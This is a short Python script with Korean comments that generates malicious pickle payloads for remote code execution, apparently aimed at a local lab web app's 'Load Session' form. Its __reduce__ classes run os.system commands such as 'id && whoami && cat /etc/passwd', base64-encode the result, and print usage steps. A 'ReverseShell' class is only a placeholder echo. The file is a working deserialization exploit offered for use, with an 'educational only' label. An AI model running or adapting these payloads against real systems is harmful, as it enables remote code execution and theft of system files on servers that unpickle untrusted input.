"""
Pickle RCE Exploit 생성기
교육 목적으로만 사용하세요!
"""
import pickle
import base64
import os


class MaliciousPickle:
    """
    __reduce__를 오버라이드하여 역직렬화 시 임의 코드 실행
    pickle.loads() 호출 시 os.system()이 실행됨
    """
    def __reduce__(self):
        # 실행할 명령어
        command = "id && whoami && cat /etc/passwd"
        return (os.system, (command,))


class ReverseShell:
    """리버스 쉘 페이로드 (실제 공격에서 사용)"""
    def __reduce__(self):
        import socket
        import subprocess
        # 주의: 실제 공격 코드 - 교육 목적으로만 참고
        command = "echo 'Reverse shell would execute here'"
        return (os.system, (command,))


class FileRead:
    """파일 읽기 페이로드"""
    def __reduce__(self):
        return (os.system, ("cat /etc/passwd",))


def generate_payload(payload_type="basic"):
    """악성 pickle 페이로드 생성"""
    if payload_type == "basic":
        malicious = MaliciousPickle()
    elif payload_type == "file":
        malicious = FileRead()
    else:
        malicious = MaliciousPickle()

    # pickle 직렬화
    pickled = pickle.dumps(malicious)
    encoded = base64.b64encode(pickled).decode()

    return encoded


if __name__ == "__main__":
    print("=" * 60)
    print("Pickle RCE Exploit Generator")
    print("=" * 60)
    print()
    print("경고: 이 도구는 교육 목적으로만 사용하세요!")
    print()

    payload = generate_payload("basic")

    print("생성된 페이로드 (Base64):")
    print("-" * 60)
    print(payload)
    print("-" * 60)
    print()
    print("사용 방법:")
    print("1. http://localhost:5001 접속")
    print("2. 'Load Session' 폼에 위 페이로드 붙여넣기")
    print("3. Submit 후 서버 로그 확인")
    print()
    print("페이로드가 실행되면 서버에서 'id', 'whoami' 명령이 실행됩니다.")
